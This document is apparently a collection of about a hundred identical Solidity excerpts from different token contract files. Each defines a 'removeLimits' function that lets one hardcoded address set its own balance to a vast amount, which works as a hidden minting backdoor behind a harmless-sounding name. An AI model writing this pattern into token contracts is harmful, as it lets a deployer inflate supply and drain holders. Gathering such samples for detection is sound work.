<source file="systems/source-code/0xA2F5f226ab0cC49602dFf5e178AC9bC978869395.sol" startline="41" endline="45" pcid="5858">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xD1B18679bc0F529e405e5838e94d9e09DA9386C1.sol" startline="44" endline="48" pcid="7466">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x91448BdD0ef6810de6E4a8B3Ba82590ab70D5b95.sol" startline="44" endline="48" pcid="5312">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xD779eC84BC7681f2d2c51799bCF0A362b5130044.sol" startline="42" endline="46" pcid="7692">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x4115454c188acFB9Cb67c6d795214055381b53B5.sol" startline="46" endline="50" pcid="2398">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xd6431990d48B3E463696fdc9860f866aFEB1e370.sol" startline="45" endline="49" pcid="7660">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x1f3adE6D938122006C0Dc9fb893d767080123917.sol" startline="38" endline="42" pcid="969">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x19a99e5BBFAE5fcF744b3C866b40e36aD15CF656.sol" startline="45" endline="49" pcid="798">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xcAE6d8F16193526B9973C93096F0B9B788af999F.sol" startline="46" endline="50" pcid="7228">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xCBf5E1478f1B77672a2684535D9aE9Fe1A7aBe5e.sol" startline="46" endline="50" pcid="7244">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x1A2d73a3c991da558bcAeE1f02408fe5a9471afa.sol" startline="42" endline="46" pcid="828">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xC2DF29A6Ee0a3C12446E45Ad1340A30fEF33a6A9.sol" startline="45" endline="49" pcid="6964">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xa23e76262e6617dab8caadd452d0f428201267e1.sol" startline="50" endline="54" pcid="5843">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xa149cAa78E7BdE7F564162B17fc98D47B70DA95a.sol" startline="42" endline="46" pcid="5824">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xc0df2A6330877c7632051E2A30e8Eb732fa1aE02.sol" startline="38" endline="42" pcid="6904">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xefbd223978ababc08414ff766cf04028daa5266a.sol" startline="50" endline="54" pcid="8761">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xf86c25675cd74be058a798894008ecf6a67dca21.sol" startline="44" endline="48" pcid="9037">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x550f95a80e42c5cfBc786C5C47322862e0332528.sol" startline="44" endline="48" pcid="3172">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x73f3b1b22f21222c593195558a8c76558f1e8ce8.sol" startline="42" endline="46" pcid="4249">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x938f386ac6101Dd112e656EdDc27C8bF32c85165.sol" startline="42" endline="46" pcid="5367">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xe022f7a1F743C18e28ABa062FCFa0746CbaE8d32.sol" startline="41" endline="45" pcid="8013">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xcc87B5c7F81B57BAE653eeb6a51265E305F85c2a.sol" startline="42" endline="46" pcid="7259">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x6bd91799f767b30b1f7aeb1239b3573b2e366b49.sol" startline="42" endline="46" pcid="3950">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x707dAb814AAE29c506EAfc8036b64066FC403444.sol" startline="41" endline="45" pcid="4127">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xccD47BEeEf5E57708853902581289A950E4E9722.sol" startline="43" endline="47" pcid="7274">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x75780415fCA0157e4814A1A2588f1eE9Ff0F7E88.sol" startline="46" endline="50" pcid="4341">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xb7844372AB08A7EBA9D3cA79ccDe3F22C990b1E5.sol" startline="45" endline="49" pcid="6664">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x346708D8507D3114a1fa26E7f5E11aE1ba50dF2a.sol" startline="45" endline="49" pcid="1635">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xc1143D26004Ec3253eF0aB4500113105164aA789.sol" startline="48" endline="52" pcid="6919">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x42237AC5Aed08d64FEAE4817fa1F0282087447f7.sol" startline="45" endline="49" pcid="2428">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x70d8b31f4eeE0E9988D0b196531205A9D30Ad104.sol" startline="45" endline="49" pcid="4149">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x34273fc3ff3f50Bef36ee6b4E999872aFddC4127.sol" startline="38" endline="42" pcid="1620">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x15fD6fad37E54f3B9fFcf3B1c4A817987Bc54EB5.sol" startline="42" endline="46" pcid="658">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xF92050985936150572FCA5d8307bfd35771CDB54.sol" startline="38" endline="42" pcid="9069">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xe0284b1a69321af02b565365Eae1a7Be844C94DB.sol" startline="40" endline="44" pcid="8028">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x0CB9CDa489aAe64FD4a31D2CD17F70dae5FE4b73.sol" startline="45" endline="49" pcid="324">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x4D8c3df04Ce9B909c9FBF4347A5a3fFAdf190142.sol" startline="45" endline="49" pcid="2906">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xfE0A4D6A16F934E3d595DB4b0D893071124CB693.sol" startline="40" endline="44" pcid="9286">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x17E0A45a46FC67d20020128E368637dEA3EFC172.sol" startline="46" endline="50" pcid="724">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x39Ac510d21f06A31e1bf897138E441661f1942a8.sol" startline="43" endline="47" pcid="1923">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xf49f16cd3370fB4cCD6C99e1C6F465d53fdec793.sol" startline="45" endline="49" pcid="8905">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x89C8Eb764Ae4e7EF67f5E84f0eeE404a2Fb02bed.sol" startline="47" endline="51" pcid="5101">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x527B878E22Db9747eeA5d5d5e6A241BB42634C5E.sol" startline="44" endline="48" pcid="3067">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x25C315bDA171D7C194840aCe6BF80EF274d97dc3.sol" startline="43" endline="47" pcid="1177">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xD53bd4D2a303F2D046C94C3553d0a34E903a9Afb.sol" startline="41" endline="45" pcid="7615">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x77b3e393d8BC4ee7a6d0afff7eDeE5c449E61852.sol" startline="43" endline="47" pcid="4485">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3B06f6027a41bfCED3D5e6855B69aeA5e7426e90.sol" startline="44" endline="48" pcid="2010">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xfd1e0ec0d64d806d833b80b8cbd01dfdc9062c3d.sol" startline="45" endline="49" pcid="9223">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3c8B8B3D57AE533C8A34A290327024f915335CA9.sol" startline="44" endline="48" pcid="2129">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xFc9804E65cC6E47964c809b9f704440DFb8C5eA0.sol" startline="41" endline="45" pcid="9201">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xDe77F59a385B50d78aeB7C646d9dF1E4fD76f1a4.sol" startline="46" endline="50" pcid="7938">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x075D3f6AcC15Caf4F8699D72Bc760A09f5842C3f.sol" startline="45" endline="49" pcid="184">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xc18250a3Ca19Da5214B0B7A16c788726139d0b00.sol" startline="45" endline="49" pcid="6949">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xf35aD950b9A888FF9E9c25B9a71c19dDF57d61F4.sol" startline="45" endline="49" pcid="8860">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xD1D8c3f9a5609027A1c7cEF070aB9c51b99DCFf7.sol" startline="45" endline="49" pcid="7481">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x9c03094376D96C2b5ffd1B1C5129b048438700CF.sol" startline="40" endline="44" pcid="5668">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x99D00D99221a9CFF03d0F48a6674b71A7d0893Fc.sol" startline="37" endline="41" pcid="5585">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x1bF767eC706587F6b3c3f475c8d76692cA19F14b.sol" startline="40" endline="44" pcid="890">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x029D614F344A2a6edE1de8ef4793a3369De927d4.sol" startline="41" endline="45" pcid="90">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xDee33C0f9d5395192ec09e6d4B3753015781C26A.sol" startline="40" endline="44" pcid="7983">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xe884A9b4fCBB75a6bBAD1d344DAaD8a5F3D0ba2A.sol" startline="40" endline="44" pcid="8388">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x681cc758d8f73Aee9cA926845b46FAc425a9f131.sol" startline="45" endline="49" pcid="3863">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xdd160949e087Ef040BbFde43E454BA45dF2E8B52.sol" startline="46" endline="50" pcid="7854">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xAe5A5174359c2c77D60aBCff529308266aa32c5e.sol" startline="44" endline="48" pcid="6313">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xFB1eef96272C53D608d11de7a92B1e7a0abF7DFc.sol" startline="46" endline="50" pcid="9123">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x2bc6B9e1b6AE7EDF9a21298Ba0bfe18a166a41d3.sol" startline="44" endline="48" pcid="1288">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x7e1bcb000d4c5ced0a5eabe44c871b5206213a4f.sol" startline="45" endline="49" pcid="4669">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xe33c37cddb31548856537434d103e57d99242efb.sol" startline="44" endline="48" pcid="8208">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x0b84Fa92739e6704EEb6658AfdA59747215B496A.sol" startline="44" endline="48" pcid="301">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x1684f783064B9F4D6273e9ed11F5D753C193E5E5.sol" startline="45" endline="49" pcid="673">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x1b7B0b213fB6B96fCFB754881175bb4422e39b52.sol" startline="45" endline="49" pcid="868">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xB656d138e4C030064A7aA8d83Aa929928A730c10.sol" startline="45" endline="49" pcid="6637">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xd85C9321Bdb4D2Ff3b0De51fd17E71E9d64a0dA4.sol" startline="40" endline="44" pcid="7737">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xEb0753dfACc48178d482640e009ec23334a91Dc5.sol" startline="42" endline="46" pcid="8545">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xb628B6198E2320437e8a9FF1e72A9FF3f1636cf9.sol" startline="48" endline="52" pcid="6622">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x73D5168CeB5a4cE0d3f74a01A92e05305339DD61.sol" startline="46" endline="50" pcid="4234">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xb5c5017c98549049c1d1Cf46e3d0eA7882a21B33.sol" startline="45" endline="49" pcid="6605">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x2fE58503d325203E80Ed379cE24a9AB5b5f56aEa.sol" startline="41" endline="45" pcid="1454">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x2f324d85C72E2d25bEA80f1aF03392825e15E49a.sol" startline="39" endline="43" pcid="1424">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x13F986545Be7680E5832C88C3BC68a096B975949.sol" startline="43" endline="47" pcid="542">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x11067Cc96F63B2b375fb740FEee95aA2009A5249.sol" startline="46" endline="50" pcid="442">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x9ed015445e359b0Dca0A93e34af01d9Dc90D3B26.sol" startline="41" endline="45" pcid="5713">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x5B8048664dB0A24b6372Cab5972baE9F40c6012e.sol" startline="42" endline="46" pcid="3465">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x49D141A0B0190d120039F603F434F51a39f33D6c.sol" startline="43" endline="47" pcid="2779">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x42825e496a72B5E3278af637a45B712E49c061A0.sol" startline="46" endline="50" pcid="2458">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xad3CEB59d03AF61608449769c223aD55478930A9.sol" startline="43" endline="47" pcid="6273">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x2e45211957ECDd650F0eAA42f6D58F03D58159e0.sol" startline="45" endline="49" pcid="1394">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x729841D06c8D569c8Dc118d9f6a5c663583d709F.sol" startline="45" endline="49" pcid="4204">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x4cb7fa2798f47c0531601d8fc33a2F1062b9B0c9.sol" startline="45" endline="49" pcid="2891">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xa71Cbe77C505140Cd10070401b82580E0Fe94a1B.sol" startline="48" endline="52" pcid="6098">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xaa268b4717907181f8826e1e5bC6ffC4BA3da5A0.sol" startline="38" endline="42" pcid="6178">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xCDFcbB5be93d37A33C85ffd7828dDDd332823349.sol" startline="41" endline="45" pcid="7305">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3ce7CAfDEB197967161757d8a44e60e9Bf58bC10.sol" startline="43" endline="47" pcid="2163">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3bcddA8f67A88449e3a6aEA912f860F28DE1A03a.sol" startline="42" endline="46" pcid="2059">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xa724ad0C59f178C3d291081b8aE06d3d23Eb5383.sol" startline="41" endline="45" pcid="6113">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x4bC87FcdC4D85341976568aD86cb5dE9c038Bd4A.sol" startline="45" endline="49" pcid="2831">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x9f111397a5A114654A9A6Aa6b3Cd35fbC4500a88.sol" startline="41" endline="45" pcid="5728">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xdCfb3170A71BE65d6Ae3d70F7B617fa2B467975f.sol" startline="41" endline="45" pcid="7829">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x36eDC92606D7cc78F9bf63665eA39Fb5A76b7796.sol" startline="45" endline="49" pcid="1825">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xfb3FCa7F38fEEAD4CbC677e8Ec4f3C159410ce18.sol" startline="45" endline="49" pcid="9138">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x8Dfec76a1104A22faAD1c7Ba7A90d9508e3eF5a7.sol" startline="41" endline="45" pcid="5195">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x97599936D137EFDD11Eaa2989F58f5a00BCd2803.sol" startline="40" endline="44" pcid="5477">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xEC55D39A13F31B2674EFD7662bB7Debeb1B65948.sol" startline="44" endline="48" pcid="8593">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x532b9b8cDdE8fDF33e41bF2aE578fC83D9CF8AC9.sol" startline="45" endline="49" pcid="3082">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
